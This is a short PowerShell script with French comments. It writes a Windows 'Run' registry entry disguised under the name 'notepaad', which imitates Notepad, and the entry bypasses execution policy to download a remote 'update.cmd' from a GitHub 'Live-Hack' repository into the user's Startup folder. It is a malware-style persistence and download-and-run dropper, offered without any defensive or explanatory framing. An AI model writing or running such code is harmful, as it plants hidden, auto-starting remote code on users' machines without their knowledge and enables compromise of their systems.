# Définition du chemin de la clé de Registre "Run"
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Définition de la commande PowerShell à exécuter au démarrage
$commande = powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/update.cmd' -OutFile '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.cmd'"

# Création de la nouvelle valeur dans la clé de Registre "Run"
New-ItemProperty -Path $regPath -Name "notepaad" -Value "$commande" -PropertyType String -Force | Out-Null
